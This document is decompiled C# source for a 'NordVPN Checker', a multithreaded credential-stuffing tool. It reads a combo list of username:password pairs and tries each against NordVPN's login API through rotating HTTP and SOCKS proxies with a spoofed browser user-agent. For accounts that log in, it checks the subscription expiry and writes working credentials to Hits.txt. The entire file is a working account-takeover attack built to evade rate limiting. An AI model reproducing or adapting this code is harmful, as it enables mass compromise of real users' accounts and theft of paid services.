using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Colorful;
using Leaf.xNet;

namespace NordVPN_Checker
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		[STAThread]
		private static void Main(string[] args)
		{
			ServicePointManager.DefaultConnectionLimit = 100000000;
			Colorful.Console.SetWindowSize(35, 35);
			Colorful.Console.Title = "[NordVPN Checker]";
			System.Console.Clear();
			Colorful.Console.WriteLine();
			System.Console.Clear();
			Colorful.Console.WriteLine();
			Colorful.Console.Write("███╗   ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ███╗   ██╗  \n", Color.Aqua);
			Colorful.Console.Write("████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║  \n", Color.Aqua);
			Colorful.Console.Write("█╔██╗ ██║██║   ██║██████╔╝██║  ██║██║   ██║██████╔╝██╔██╗ ██║     \n", Color.Aqua);
			Colorful.Console.Write("██║╚██╗██║██║   ██║██╔══██╗██║  ██║╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║     \n", Color.Aqua);
			Colorful.Console.Write("██║ ╚████║╚██████╔╝██║  ██║██████╔╝ ╚████╔╝ ██║     ██║ ╚████║      \n", Color.Aqua);
			Colorful.Console.Write("╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝     ╚═╝  ╚═══╝       \n", Color.Aqua);
			Thread.Sleep(250);
			Colorful.Console.Write("> How many ", Color.Red);
			Colorful.Console.Write("THREADS", Color.Red);
			Colorful.Console.Write(" do you want to use", Color.Red);
			Colorful.Console.Write(": ", Color.Aquamarine);
			int maxDegreeOfParallelism = int.Parse(Colorful.Console.ReadLine());
			for (;;)
			{
				Colorful.Console.Write("> What type of ", Color.Red);
				Colorful.Console.Write("PROXIES ", Color.Red);
				Colorful.Console.Write("[HTTP, SOCKS4, SOCKS5]", Color.Lime);
				Colorful.Console.Write(": ", Color.Lime);
				Program.proxyType = Colorful.Console.ReadLine();
				Program.proxyType = Program.proxyType.ToUpper();
				bool flag = Program.proxyType.Contains("HTTP") || Program.proxyType.Contains("SOCKS4") || Program.proxyType.Contains("SOCKS5");
				if (flag)
				{
					break;
				}
				Colorful.Console.Write("> Please select a valid proxy format.\n\n", Color.Red);
				Thread.Sleep(2000);
			}
			Task.Factory.StartNew(delegate()
			{
				for (;;)
				{
					Program.CPM = Program.CPM_aux;
					Program.CPM_aux = 0;
					Colorful.Console.Title = string.Format("[NordVPN Checker] | Checked: {0}/{1} | Hits: {2} | Bad: {3} | Errors: {5} | CPM: ", new object[]
					{
						Program.checkedCounter,
						Program.totalCounter,
						Program.hitCounter,
						Program.badCounter,
						Program.Expired,
						Program.errorCounter
					}) + (Program.CPM * 60).ToString();
					Thread.Sleep(1000);
				}
			});
			Task.Factory.StartNew(delegate()
			{
				while (Program.stopCount != maxDegreeOfParallelism && Program.stopCount - 1 != maxDegreeOfParallelism - 1)
				{
					bool flag2 = Program.hitCombos != "";
					if (flag2)
					{
						File.AppendAllText("Hits.txt", Program.hitCombos);
					}
					Program.hitCombos = "";
					Thread.Sleep(1500);
				}
				Colorful.Console.WriteLine("\n> Done.", Color.White);
				Thread.Sleep(100000000);
				Environment.Exit(0);
			});
			Colorful.Console.WriteLine();
			string fileName;
			do
			{
				Colorful.Console.WriteLine("Select your Combos", Color.Lime);
				Thread.Sleep(500);
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Title = "Select Combo List";
				openFileDialog.DefaultExt = "txt";
				openFileDialog.Filter = "Text files|*.txt";
				openFileDialog.RestoreDirectory = true;
				openFileDialog.ShowDialog();
				fileName = openFileDialog.FileName;
			}
			while (!File.Exists(fileName));
			Program.comboList = new List<string>(File.ReadAllLines(fileName));
			using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (BufferedStream bufferedStream = new BufferedStream(fileStream))
				{
					using (StreamReader streamReader = new StreamReader(bufferedStream))
					{
						while (streamReader.ReadLine() != null)
						{
							Program.totalCounter++;
						}
					}
				}
			}
			Colorful.Console.Write("> ");
			Colorful.Console.Write(Program.totalCounter, Color.Aquamarine);
			Colorful.Console.WriteLine(" Combos added\n");
			do
			{
				Colorful.Console.WriteLine("Select your Proxies", Color.Lime);
				Thread.Sleep(500);
				OpenFileDialog openFileDialog2 = new OpenFileDialog();
				openFileDialog2.Title = "Select Proxy List";
				openFileDialog2.DefaultExt = "txt";
				openFileDialog2.Filter = "Text files|*.txt";
				openFileDialog2.RestoreDirectory = true;
				openFileDialog2.ShowDialog();
				fileName = openFileDialog2.FileName;
			}
			while (!File.Exists(fileName));
			Program.proxyList = new List<string>(File.ReadAllLines(fileName));
			using (FileStream fileStream2 = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (BufferedStream bufferedStream2 = new BufferedStream(fileStream2))
				{
					using (StreamReader streamReader2 = new StreamReader(bufferedStream2))
					{
						while (streamReader2.ReadLine() != null)
						{
							Program.proxyTotalCounter++;
						}
					}
				}
			}
			Colorful.Console.Write("> ");
			Colorful.Console.Write(Program.proxyTotalCounter, Color.Aquamarine);
			Colorful.Console.WriteLine(" Proxies added\n");
			for (int i = 1; i <= maxDegreeOfParallelism; i++)
			{
				new Thread(new ThreadStart(Program.Check)).Start();
			}
			Colorful.Console.ReadLine();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002510 File Offset: 0x00000710
		public static void Check()
		{
			for (;;)
			{
				bool flag = Program.proxyNumber > Program.proxyList.Count<string>() - 2;
				if (flag)
				{
					Program.proxyNumber = 0;
				}
				try
				{
					Interlocked.Increment(ref Program.proxyNumber);
					using (HttpRequest httpRequest = new HttpRequest())
					{
						bool flag2 = Program.comboNumber >= Program.comboList.Count<string>();
						if (flag2)
						{
							Program.stopCount++;
							break;
						}
						Interlocked.Increment(ref Program.comboNumber);
						string[] array = Program.comboList[Program.comboNumber].Split(new char[]
						{
							':'
						});
						string text = array[0] + ":" + array[1];
						try
						{
							httpRequest.IgnoreProtocolErrors = true;
							httpRequest.KeepAlive = true;
							bool flag3 = Program.proxyType == "HTTP";
							if (flag3)
							{
								httpRequest.Proxy = HttpProxyClient.Parse(Program.proxyList[Program.proxyNumber]);
							}
							bool flag4 = Program.proxyType == "SOCKS4";
							if (flag4)
							{
								httpRequest.Proxy = Socks4ProxyClient.Parse(Program.proxyList[Program.proxyNumber]);
							}
							bool flag5 = Program.proxyType == "SOCKS5";
							if (flag5)
							{
								httpRequest.Proxy = Socks5ProxyClient.Parse(Program.proxyList[Program.proxyNumber]);
							}
							httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
							httpRequest.AddHeader("Accept", "*/*");
							string text2 = httpRequest.Post("https://api.nordvpn.com/v1/users/tokens", string.Concat(new string[]
							{
								"{\"username\":\"",
								array[0],
								"\",\"password\":\"",
								array[1],
								"\"}"
							}), "application/json").ToString();
							bool flag6 = text2.Contains("user_id\":");
							if (flag6)
							{
								string str = Utils.LRParse(text2, "token\":\"", "\"", false, false);
								string str2 = Program.Base64Encode("token:" + str);
								httpRequest.AddHeader("Authorization", "Basic " + str2);
								string value = Utils.LRParse(httpRequest.Get("https://api.nordvpn.com/v1/users/services", null).ToString(), "expires_at\":\"", "\"", false, false);
								DateTime t = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
								DateTime t2 = Convert.ToDateTime(value);
								bool flag7 = DateTime.Compare(t, t2) < 0;
								if (flag7)
								{
									Program.CPM_aux++;
									Program.checkedCounter++;
									Program.hitCounter++;
									Colorful.Console.WriteLine("[GOOD] " + text, Color.Lime);
									Program.hitCombos = Program.hitCombos + text + "\n";
								}
								else
								{
									Program.CPM_aux++;
									Program.checkedCounter++;
									Program.Expired++;
									Colorful.Console.WriteLine("[BAD] " + text, Color.Red);
								}
							}
							else
							{
								bool flag8 = text2.Contains("code\":101301");
								if (flag8)
								{
									Program.CPM_aux++;
									Program.checkedCounter++;
									Program.badCounter++;
									Colorful.Console.WriteLine("[BAD] " + text, Color.DarkRed);
								}
								else
								{
									bool flag9 = text2.Contains("message\":\"Unauthorized");
									if (flag9)
									{
										Program.CPM_aux++;
										Program.checkedCounter++;
										Program.badCounter++;
										Colorful.Console.WriteLine("[BAD] " + text, Color.DarkRed);
									}
									else
									{
										Program.errorCounter++;
										Program.comboList.Add(text);
									}
								}
							}
						}
						catch (Exception)
						{
							Program.comboList.Add(text);
							Interlocked.Increment(ref Program.errorCounter);
						}
					}
				}
				catch (Exception)
				{
					Interlocked.Increment(ref Program.errorCounter);
				}
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000295C File Offset: 0x00000B5C
		public static void CPM_Worker(object sender, ElapsedEventArgs e)
		{
			Program.CPM = Program.CPM_aux;
			Program.CPM_aux = 0;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002970 File Offset: 0x00000B70
		public static string Base64Encode(string plainText)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		}

		// Token: 0x04000001 RID: 1
		public static int badCounter = 0;

		// Token: 0x04000002 RID: 2
		public static int Expired = 0;

		// Token: 0x04000003 RID: 3
		public static int hitCounter = 0;

		// Token: 0x04000004 RID: 4
		public static int errorCounter = 0;

		// Token: 0x04000005 RID: 5
		public static int totalCounter = 0;

		// Token: 0x04000006 RID: 6
		public static int checkedCounter = 0;

		// Token: 0x04000007 RID: 7
		public static int comboNumber = 0;

		// Token: 0x04000008 RID: 8
		public static List<string> proxyList = new List<string>();

		// Token: 0x04000009 RID: 9
		public static string proxyType = "";

		// Token: 0x0400000A RID: 10
		public static int proxyNumber = 0;

		// Token: 0x0400000B RID: 11
		public static int proxyTotalCounter = 0;

		// Token: 0x0400000C RID: 12
		public static int stopCount = 0;

		// Token: 0x0400000D RID: 13
		public static string hitCombos;

		// Token: 0x0400000E RID: 14
		public static List<string> comboList = new List<string>();

		// Token: 0x0400000F RID: 15
		public static int CPM = 0;

		// Token: 0x04000010 RID: 16
		public static int CPM_aux = 0;

		// Token: 0x02000004 RID: 4
		public static class TextTool
		{
			// Token: 0x0600000A RID: 10 RVA: 0x00002D00 File Offset: 0x00000F00
			public static int CountStringOccurrences(string text, string pattern)
			{
				int num = 0;
				int num2 = 0;
				while ((num2 = text.IndexOf(pattern, num2)) != -1)
				{
					num2 += pattern.Length;
					num++;
				}
				return num;
			}
		}
	}
}
